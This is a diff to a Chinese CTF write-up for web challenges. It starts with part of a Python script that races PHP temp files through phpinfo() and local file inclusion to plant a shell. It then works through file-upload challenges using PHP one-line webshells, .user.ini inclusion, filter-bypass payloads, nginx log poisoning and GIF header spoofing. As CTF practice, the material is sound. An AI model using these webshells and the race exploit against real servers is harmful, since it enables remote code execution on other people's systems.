+def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+ 
+    s.connect((host, port))
+    s2.connect((host, port))
+ 
+    s.send(phpinforeq)
+    d = ""
+    while len(d) < offset:
+        d += s.recv(offset)
+    try:
+        i = d.index("[tmp_name] =&gt; ")
+        fn = d[i+17:i+31]
+    except ValueError:
+        return None
+ 
+    s2.send(lfireq % (fn, host))
+    d = s2.recv(4096)
+    s.close()
+    s2.close()
+ 
+    if d.find(tag) != -1:
+        return fn
+ 
+counter=0
+class ThreadWorker(threading.Thread):
+    def __init__(self, e, l, m, *args):
+        threading.Thread.__init__(self)
+        self.event = e
+        self.lock =  l
+        self.maxattempts = m
+        self.args = args
+ 
+    def run(self):
+        global counter
+        while not self.event.is_set():
+            with self.lock:
+                if counter >= self.maxattempts:
+                    return
+                counter+=1
+ 
+            try:
+                x = phpInfoLFI(*self.args)
+                if self.event.is_set():
+                    break                
+                if x:
+                    print "\nGot it! Shell created in /tmp/g"
+                    self.event.set()
+                    
+            except socket.error:
+                return
+    
+ 
+def getOffset(host, port, phpinforeq):
+    """Gets offset of tmp_name in the php output"""
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((host,port))
+    s.send(phpinforeq)
+    
+    d = ""
+    while True:
+        i = s.recv(4096)
+        d+=i        
+        if i == "":
+            break
+        # detect the final chunk
+        if i.endswith("0\r\n\r\n"):
+            break
+    s.close()
+    i = d.find("[tmp_name] =&gt; ")
+    if i == -1:
+        raise ValueError("No php tmp_name in phpinfo output")
+    
+    print "found %s at %i" % (d[i:i+10],i)
+    # padded up a bit
+    return i+256
+ 
+def main():
+    
+    print "LFI With PHPInfo()"
+    print "-=" * 30
+ 
+    if len(sys.argv) < 2:
+        print "Usage: %s host [port] [threads]" % sys.argv[0]
+        sys.exit(1)
+ 
+    try:
+        host = socket.gethostbyname(sys.argv[1])
+    except socket.error, e:
+        print "Error with hostname %s: %s" % (sys.argv[1], e)
+        sys.exit(1)
+ 
+    port=80
+    try:
+        port = int(sys.argv[2])
+    except IndexError:
+        pass
+    except ValueError, e:
+        print "Error with port %d: %s" % (sys.argv[2], e)
+        sys.exit(1)
+    
+    poolsz=10
+    try:
+        poolsz = int(sys.argv[3])
+    except IndexError:
+        pass
+    except ValueError, e:
+        print "Error with poolsz %d: %s" % (sys.argv[3], e)
+        sys.exit(1)
+ 
+    print "Getting initial offset...",  
+    reqphp, tag, reqlfi = setup(host, port)
+    offset = getOffset(host, port, reqphp)
+    sys.stdout.flush()
+ 
+    maxattempts = 1000
+    e = threading.Event()
+    l = threading.Lock()
+ 
+    print "Spawning worker pool (%d)..." % poolsz
+    sys.stdout.flush()
+ 
+    tp = []
+    for i in range(0,poolsz):
+        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))
+ 
+    for t in tp:
+        t.start()
+    try:
+        while not e.wait(1):
+            if e.is_set():
+                break
+            with l:
+                sys.stdout.write( "\r% 4d / % 4d" % (counter, maxattempts))
+                sys.stdout.flush()
+                if counter >= maxattempts:
+                    break
+        print
+        if e.is_set():
+            print "Woot!  \m/"
+        else:
+            print ":("
+    except KeyboardInterrupt:
+        print "\nTelling threads to shutdown..."
+        e.set()
+    
+    print "Shuttin' down..."
+    for t in tp:
+        t.join()
+ 
+if __name__=="__main__":
+    main()
+```
+
+
+
+
+
+### 文件上传
+
+#### web151
+
+![image-20250126161249975](C:\Users\xrntkk\AppData\Roaming\Typora\typora-user-images\image-20250126161249975.png)
+
+前台验证
+
+将一句话木马改成png，抓包修改后缀即可
+
+![image-20250126162045356](C:\Users\xrntkk\AppData\Roaming\Typora\typora-user-images\image-20250126162045356.png)
+
+
+
+
+
+payload:
+
+```
+1=system('cat /var/www/html/flag.php');
+```
+
+
+
+#### web152
+
+这道题没有前端检验，但是解法跟web151是一样的
+
+![image-20250126162605410](C:\Users\xrntkk\AppData\Roaming\Typora\typora-user-images\image-20250126162605410.png)
+
+
+
+#### web153
+
+一开始尝试了大小写绕过
+
+![image-20250126162904156](C:\Users\xrntkk\AppData\Roaming\Typora\typora-user-images\image-20250126162904156.png)
+
+上传后发现服务器不解析
+
+这题可以利用.user.ini来进行文件上传
+
+[[文件上传\]浅析.user.ini的利用-CSDN博客](https://blog.csdn.net/cosmoslin/article/details/120793126)
+
+首先我们在文件中写入
+
+![image-20250126180536890](C:\Users\xrntkk\AppData\Roaming\Typora\typora-user-images\image-20250126180536890.png)
+
+这句话相当于php中的文件包含
+
+写入后将文件改为png上传，抓包将文件名改为.user.ini
+
+![image-20250126181011811](C:\Users\xrntkk\AppData\Roaming\Typora\typora-user-images\image-20250126181011811.png)
+
+接着将一句话木马改为1.png上传
+
+![image-20250126181138882](C:\Users\xrntkk\AppData\Roaming\Typora\typora-user-images\image-20250126181138882.png)
+
+接着访问 /upload/index.php
+
+payload:
+
+```
+1=system('tac ../f*');
+```
+
+![image-20250126181319071](C:\Users\xrntkk\AppData\Roaming\Typora\typora-user-images\image-20250126181319071.png)
+
+注意这个方法的前提是文件上传的目录中有能够执行的php的文件（如index.php）
+
+#### web154
+
+这题跟上题差不多，只是过滤了php
+
+将一句话木马改成短标签的形式就可以了（我一直用的短标签所以没什么影响）
+
+
+
+#### web155
+
+解法同web154一样
+
+
+
+#### web156
+
+![image-20250126194012094](C:\Users\xrntkk\AppData\Roaming\Typora\typora-user-images\image-20250126194012094.png)
+
+这题有新的waf,可以测出来waf掉了[]
+
+那既然这样我们直接读flag就是了
+
+```
+<?=system('cat ../f*');?>
+```
+
+或者也可以用{}代替['']
+
+```
+<?=@eval($_GET{1});?>
+```
+
+
+
+#### web157
+
+![image-20250126203400690](C:\Users\xrntkk\AppData\Roaming\Typora\typora-user-images\image-20250126203400690.png)
+
+这道题[]和;都被waf了
+
+payload:
+
+```
+<?=system("tac ../f*")?>
+```
+
+不写;就行了
+
+
+
+#### web158
+
+这题和上题的解法一样
+
+
+
+#### web159
+
+![image-20250126205519235](C:\Users\xrntkk\AppData\Roaming\Typora\typora-user-images\image-20250126205519235.png)
+
+这题waf掉了()
+
+ 没有()怎么进行rce呢？我们可以想到``进行命令执行的技巧
+
+payload:
+
+```
+<?=`tac ../f*`?>
+```
+
+
+
+#### web160
+
+![image-20250126211936519](C:\Users\xrntkk\AppData\Roaming\Typora\typora-user-images\image-20250126211936519.png)
+
+一开始发现.user.ini穿不上，后面测到原来是空格被waf了，.user.ini里也不能有空格
+
+相比上一题这题将空格和``反引号和log过滤掉了
+
+这题我们可以考虑使用日志注入的方法
+
+尝试一下包含日志 nginx的log在/var/log/nginx/access.log
+
+payload:
+
+```
+<?=include"/var/l"."og/nginx/access.l"."og"?>
+```
+
+![image-20250126213809672](C:\Users\xrntkk\AppData\Roaming\Typora\typora-user-images\image-20250126213809672.png)
+
+看到有user-agent说明这条路行得通
+
+![image-20250126214026378](C:\Users\xrntkk\AppData\Roaming\Typora\typora-user-images\image-20250126214026378.png)
+
+直接读flag
+
+![image-20250126214050381](C:\Users\xrntkk\AppData\Roaming\Typora\typora-user-images\image-20250126214050381.png)
+
+
+
+#### web161
+
+这一题在上一题的基础上增加了文件头的检验
+
+我们可以通过在上传文件的时候加上图片的文件头**GIF89a**进行绕过
+
+![image-20250126214924176](C:\Users\xrntkk\AppData\Roaming\Typora\typora-user-images\image-20250126214924176.png)
+
+其余和web160无异，利用文件包含进行日志注入即可
+
+
+
+#### web162
+
+
+
+
+
+
+
 ### sql注入
 
 #### web171
@@ -5998,7 +7670,7 @@ api/?id=1' union select 1,(select group_concat(schema_name) from information_sch
 }     
 ```
 
-​     
+ 
 
 ### 反序列化
 
